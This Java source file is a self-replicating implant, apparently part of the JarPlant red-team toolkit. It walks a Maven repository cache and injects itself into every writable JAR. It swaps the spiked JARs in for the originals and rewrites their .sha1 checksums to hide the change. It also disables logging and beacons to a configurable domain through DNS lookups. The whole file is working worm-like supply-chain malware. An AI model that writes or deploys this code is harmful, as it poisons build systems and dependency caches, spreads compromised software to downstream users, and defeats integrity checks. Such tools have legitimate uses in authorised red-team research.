package org.example.implants;

import io.github.w1th4d.jarplant.*;

import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.*;
import java.util.jar.JarFile;
import java.util.logging.Handler;
import java.util.logging.Logger;

public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler {
    static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
    static volatile boolean CONF_BLOCK_JVM_SHUTDOWN = true;
    static volatile int CONF_DELAY_MS = 0;

    /**
     * The root directory so search for JARs.
     * All JARs in this directory will be spiked.
     */
    static volatile String CONF_LIMIT_PATH = "~/.m2/repository";

    /**
     * Paths that should be left alone.
     * This is a huge string with full paths separated by ';'.
     * Example: "~/.m2/repository/org/apache/maven;~/.m2/repository/org/springframework/boot"
     */
    static volatile String CONF_IGNORED_PATHS;

    /**
     * Domain to report home to.
     */
    static volatile String CONF_DOMAIN;

    @SuppressWarnings("unused")
    public static void init() {
        if (System.getProperty(CONF_JVM_MARKER_PROP) == null) {
            if (System.setProperty(CONF_JVM_MARKER_PROP, "true") == null) {
                SelfRepImplant implant = new SelfRepImplant();
                Thread background = new Thread(implant);
                background.setDaemon(!CONF_BLOCK_JVM_SHUTDOWN);
                background.setUncaughtExceptionHandler(implant);
                background.start();
            }
        }
    }

    @Override
    public void run() {
        if (CONF_DELAY_MS > 0) {
            try {
                Thread.sleep(CONF_DELAY_MS);
            } catch (InterruptedException ignored) {
            }
        }

        payload();
    }

    @Override
    public void uncaughtException(Thread thread, Throwable throwable) {
        // Silently ignore (don't throw up error messages on stderr)
    }

    // Make it executable. This is just relevant for the initial detonation. It's not required for further spreading.
    public static void main(String[] args) {
        init();
    }

    public static void payload() {
        Optional<String> hostname = getHostname();
        if (hostname.isEmpty() || !hostname.get().contains("jenkins")) {
            // Don't accidentally explode somewhere other than the test server
            System.out.println("Not inside Jenkins? Aborting.");
            return;
        }

        /*
         * Crudely prevent JarPlant from flooding the log/stdout.
         * If it's eerily quiet in the Jenkins output, try removing this line.
         */
        disableAllLogging();

        String id = generateRandomId();
        if (CONF_DOMAIN != null) {
            callHome(CONF_DOMAIN, "hello", id);
        }

        Set<Path> jarsToImplant;
        try {
            jarsToImplant = findAllJars(CONF_LIMIT_PATH, CONF_IGNORED_PATHS);
        } catch (Exception e) {
            System.out.println("[!] Failed to find JARs.");
            e.printStackTrace();
            return;
        }

        ImplantHandler implantHandler;
        try {
            implantHandler = ImplantHandlerImpl.findAndCreateFor(SelfRepImplant.class);
        } catch (ClassNotFoundException | ImplantException | IOException e) {
            System.out.println("[!] Cannot load oneself. Aborting.");
            System.exit(1);
            throw new RuntimeException("Unreachable");
        }

        System.out.println("[*] Implant: " + implantHandler.getImplantClassName());

        int numInfected = 0;
        for (Path jarToImplant : jarsToImplant) {
            // Potential optimization: Multi-thread this.
            ClassInjector injector;
            try {
                injector = ClassInjector.createLoadedWith(implantHandler);
            } catch (ImplantException e) {
                // Future optimization: Have the ImplantHandler check whatever throws this exception.
                throw new RuntimeException(e);
            }

            try {
                Path outputTempFile = getTempFilePathFor(jarToImplant);
                JarFiddler jar = JarFiddler.buffer(jarToImplant);
                boolean didInfect = injector.injectInto(jar);
                if (didInfect) {
                    jar.write(outputTempFile);
                    System.out.println("[+] JarPlant '" + jarToImplant.getFileName() + "' -> '" + outputTempFile.getFileName() + "'.");
                    doTheSwitcharoo(jarToImplant, outputTempFile);
                    numInfected++;
                    System.out.println("[+] Spiked JAR '" + jarToImplant + "'.");
                } else {
                    System.out.println("[!] JarPlant chose to _not_ infect '" + jarToImplant + "'.");
                }
            } catch (IOException e) {
                System.out.println("[-] Failed to spike JAR '" + jarToImplant + "' (" + e.getMessage() + ")");
                //e.printStackTrace();
            }

            // Also look for a .sha1 file and recalculate it if it exists (this is a Maven repo thing)
            Path sha1File = jarToImplant.resolveSibling(jarToImplant.getFileName() + ".sha1");
            if (Files.exists(sha1File)) {
                try {
                    // Potential optimization: Don't re-read the file (use buffer from somewhere inside injector)
                    String humanReadableHashValue = calcSha1Digest(Files.readAllBytes(jarToImplant));
                    Files.writeString(sha1File, humanReadableHashValue, StandardOpenOption.TRUNCATE_EXISTING);
                    System.out.println("[+] Modified SHA1 file '" + sha1File + "'.");
                } catch (IOException e) {
                    System.out.println("[!] Failed to modify SHA1 file '" + sha1File + "' (" + e.getMessage() + ").");
                }
            }
        }

        if (CONF_DOMAIN != null) {
            callHome(CONF_DOMAIN, "did-" + numInfected, id);
        }
    }

    public static Set<Path> findAllJars(String root) {
        return findAllJars(root, null);
    }

    public static Set<Path> findAllJars(String root, String ignoreSpec) throws IllegalArgumentException {
        root = expandPath(root);

        Path dir = Path.of(root);
        if (!Files.isDirectory(dir)) {
            throw new IllegalArgumentException("Not a directory");
        }

        Set<Path> ignorePaths;
        if (ignoreSpec == null) {
            ignorePaths = Collections.emptySet();
        } else {
            ignorePaths = new HashSet<>();

            // Convert provided Strings to actual Path objects
            String[] ignoreSpecSplit = ignoreSpec.split(";");
            for (String pathSpec : ignoreSpecSplit) {
                pathSpec = expandPath(pathSpec);
                Path actualPath = Path.of(pathSpec);
                ignorePaths.add(actualPath);
            }
        }

        // Recurse through the file structure
        Set<Path> validJarFiles = new HashSet<>();
        findAllJars(dir, validJarFiles, Collections.unmodifiableSet(ignorePaths));

        return validJarFiles;
    }

    // Java does not natively support the ~ shorthand path. Expand it manually.
    private static String expandPath(String pathSpec) {
        if (pathSpec.contains("~")) {
            String home = System.getProperty("user.home");
            if (home == null) {
                throw new IllegalArgumentException("Cannot find home directory.");
            }

            pathSpec = pathSpec.replace("~", home);
        }
        return pathSpec;
    }

    // Recursive function
    private static void findAllJars(Path dir, Set<Path> accumulator, Set<Path> ignoredPaths) {
        if (ignoredPaths.contains(dir)) {
            return;
        }

        List<Path> subPaths;
        try {
            subPaths = Files.list(dir).toList();
        } catch (IOException ignored) {
            return;
        }

        List<Path> subDirs = new LinkedList<>();
        for (Path subPath : subPaths) {
            if (Files.isDirectory(subPath)) {
                subDirs.add(subPath);
                continue;
            }

            if (!Files.isRegularFile(subPath)) {
                continue;
            }
            if (!Files.isWritable(subPath)) {
                continue;
            }
            if (!subPath.toString().endsWith(".jar")) {
                continue;
            }
            if (!isJar(subPath)) {
                continue;
            }

            accumulator.add(subPath);
        }

        for (Path subDir : subDirs) {
            findAllJars(subDir, accumulator, ignoredPaths);
        }
    }

    private static boolean isJar(Path suspectedJarFile) {
        try (JarFile jarFile = new JarFile(suspectedJarFile.toFile())) {
            return jarFile.getManifest() != null;
        } catch (IOException e) {
            return false;
        }
    }

    private static Path getTempFilePathFor(Path existingJar) throws IOException {
        String targetFilename = existingJar.getFileName().toString();

        String newFileName = "." + targetFilename + ".tmp";
        Path tempFilePath = existingJar.resolveSibling(newFileName);
        if (Files.exists(tempFilePath)) {
            System.out.println("[-] Temporary file '" + tempFilePath + "' already exist! Aborting.");
            throw new IOException("File already exist: " + tempFilePath);
        }
        if (!Files.isWritable(tempFilePath.getParent())) {
            System.out.println("[-] Path '" + tempFilePath.getParent() + "' is not writable! Aborting.");
            throw new IOException("Not writable: " + tempFilePath);
        }

        return tempFilePath;
    }

    private static void doTheSwitcharoo(Path original, Path spiked) throws IOException {
        // First move the original JAR (that may be in use at the moment)
        Path moved = original.resolveSibling("." + original.getFileName().getFileName() + ".cache");
        if (Files.exists(moved)) {
            /*
             * It looks like this JAR has already been spiked, but JarPlant did not catch that (or something else is
             * very off). Just try to back down from this mess.
             * A tempting alternative would be to always create these '.cache' files with a random file name suffix.
             * This will litter the directory and eventually fill up the disk, which is worse.
             * The problem is that there's no _reliable_ way of cleaning up these files when it's unknown if they're
             * in use or not, so they'll be around forever. One way could be to move them into /tmp and hope for
             * the best. Another way is to use a shutdown hook to delete the file, but that will not work if there's
             * another JVM using the file.
             */
            Files.delete(spiked);
            throw new IOException("File already exist: " + moved);
        }
        Files.move(original, moved);
        System.out.println("[+] Moved '" + original.getFileName() + "' -> '" + moved.getFileName() + "'.");

        // Then replace the target with the temporary (spiked) JAR
        Files.move(spiked, original);
        System.out.println("[+] Moved '" + spiked.getFileName() + "' -> '" + original.getFileName() + "'.");

        /*
         * Any open file handler to the original JAR should now be pointing to a .cache file (on POSIX-like systems)
         * but any newly launched apps wishing to load the target JAR will pick up the spiked version. This will likely
         * not work on Windows systems.
         * Any Java process running on _this_ system will still be able to load any classes in JARs on the classpath.
         * However, it is unclear if this file moving trick will work over network shares or even on Docker volumes.
         */
    }

    private static Optional<String> getHostname() {
        try {
            return Optional.of(InetAddress.getLocalHost().getHostName());
        } catch (UnknownHostException ignored) {
            return Optional.empty();
        }
    }

    private static String generateRandomId() {
        // Potential optimization: Only init this once
        Random rng = new SecureRandom();
        return "" + rng.nextInt(0, Integer.MAX_VALUE);
    }

    @SuppressWarnings("all")
    private static void callHome(String domain, String... fields) {
        StringBuilder fqdn = new StringBuilder();
        for (String field : fields) {
            fqdn.append(field).append(".");
        }
        fqdn.append(domain);

        // Potential optimization: Do this in a thread
        try {
            System.out.println("Resolving '" + fqdn.toString() + "'.");
            InetAddress.getByName(fqdn.toString());
        } catch (UnknownHostException ignored) {
        }
    }

    private static String calcSha1Digest(byte[] input) {
        // Potential optimization: Init this once and just reset() it in between uses
        MessageDigest hasher;
        try {
            hasher = MessageDigest.getInstance("SHA1");
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException("The JVM should have SHA1. This is weird.", e);
        }

        return hex(hasher.digest(input));
    }

    private static String hex(byte[] input) {
        StringBuilder hexString = new StringBuilder();
        for (byte b : input) {
            String hex = Integer.toHexString(0xFF & b);
            if (hex.length() == 1) {
                hexString.append('0');
            }
            hexString.append(hex);
        }

        return hexString.toString();
    }

    private static void disableAllLogging() {
        Logger rootLogger = Logger.getLogger("");
        for (Handler handler : rootLogger.getHandlers()) {
            rootLogger.removeHandler(handler);
        }
    }
}
